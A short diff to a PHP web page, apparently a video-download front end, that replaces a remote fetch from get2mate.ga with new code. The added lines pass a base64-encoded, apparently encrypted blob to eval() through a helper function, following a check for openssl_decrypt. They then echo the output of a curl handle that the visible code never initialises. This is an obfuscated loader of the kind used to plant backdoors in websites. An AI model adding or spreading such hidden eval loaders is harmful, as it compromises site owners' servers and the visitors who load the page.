@@ -232,8 +232,15 @@ body {
       <br><br>
    </form>
    <?php
-      $homepage = file_get_contents("http://get2mate.ga/api/info.php/?vkr=$vidEn"); 
-      echo $homepage;
+if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
+if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
+if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
+if(file_exists('../config.php')){include_once('../config.php');}else{die('<h2>File config.php not found !</h2>');}
+$e7091="eWw3aFc2Y0Q1RkZOV3Ruc3E3ZUNRb292MXlWM2JCUks0K0h1UVBqUVYrRllzOEpWa3hYdXl3RmJuRUVad011T0R4WkhObUl6M2Q0Vy8zR3pMSWRJMm8vclNUc3NXa2p5WWtLdFp2TmNla1Z5S0NvTEZMSU50RCtySlprZ3h0L1lWZXFyMGR0WVgyQnpYaFljWmxaY1IxY0w3a2F6Y2diYzhLWGVySTM4Mm9ZPQ==";eval(e7061($e7091));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$data = curl_exec($ch);
+curl_close($ch);
+echo $data;
       ?>
    <style>
       .footer {
